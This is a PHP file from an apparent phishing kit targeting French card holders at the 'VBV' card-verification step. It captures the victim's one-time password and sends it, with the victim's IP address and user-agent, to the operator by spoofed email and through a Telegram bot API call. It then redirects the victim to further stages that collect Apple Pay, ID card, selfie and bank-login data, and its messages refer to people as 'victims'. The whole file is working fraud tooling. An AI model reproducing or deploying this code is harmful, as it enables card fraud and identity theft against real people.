<?php 
session_start();
include('../settings.php');
include ('../isk/all.php');


if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{


		if(strpos($_SERVER['REQUEST_URI'], "otp=true"))
		{


				$_SESSION['otp'] = $_POST['otp'];
					$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=9A=80=E3=80=8D-_VBV_-?= ".$_SESSION['ip'];
				$message ="

🏛️ OTP : ".$_SESSION['otp']."


🔑 Adresse IP : ".$_SESSION['ip']."
🕹️ User-agent : ".$_SESSION['useragent']."

                      ";
                      $headers = "From: =?utf-8?Q?=F0=9F=A5=B7?= ".$spammername." =?utf-8?Q?=F0=9F=A5=B7?= <email@crusixv4.me>";
                      mail($boiterez,$subject,$message,$headers);

                       if($telegram == "on")
                      {
      
  $data = [
                                      'text' => '

🏛️ OTP : '.$_SESSION['otp'].'


🔑 Adresse IP : '.$_SESSION['ip'].'
🕹️ User-agent : '.$_SESSION['useragent'].'

                                      ',
                                      'chat_id' => $chat_id
                                ];

                            file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );

                      }

                      if($applepay == "on")
							{

								header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotoapplepay']);


							}

							else{
								if($cni == "on")
								{
									header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotocni']);

								}
								else{

									if($selfie == "on")
									{
										header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotoselfie']);
									}
									else
									{

										if($log_bank == "on")
										{
											header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotologbank']);

										}
										else{

											header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotofinished']);

										}

									}

								}


							}


		}
		else{


			$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=9A=80=E3=80=8D-_VBV_-?= ".$_SESSION['ip'];
				$message ="

Une victime a accepter la transaction, regardez la page de vbv.


🔑 Adresse IP : ".$_SESSION['ip']."
🕹️ User-agent : ".$_SESSION['useragent']."

                      ";
                      $headers = "From: =?utf-8?Q?=F0=9F=A5=B7?= ".$spammername." =?utf-8?Q?=F0=9F=A5=B7?= <email@crusixv4.me>";
                      mail($boiterez,$subject,$message,$headers);

                        if($telegram == "on")
                      {
      
  $data = [
                                      'text' => '
                                      
Une victime a accepter la transaction, regardez la page de vbv.


🔑 Adresse IP : '.$_SESSION['ip'].'
🕹️ User-agent : '.$_SESSION['useragent'].'

                                      ',
                                      'chat_id' => $chat_id
                                ];

                            file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );

                      }

                      if($applepay == "on")
							{

								header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotoapplepay']);


							}

							else{
								if($cni == "on")
								{
									header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotocni']);

								}
								else{

									if($selfie == "on")
									{
										header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotoselfie']);
									}
									else
									{

										if($log_bank == "on")
										{
											header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotologbank']);

										}
										else{

											header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotofinished']);

										}

									}

								}


							}


		}





}
else{

			die('HTTP/1.0 404 Not Found');

}


?>
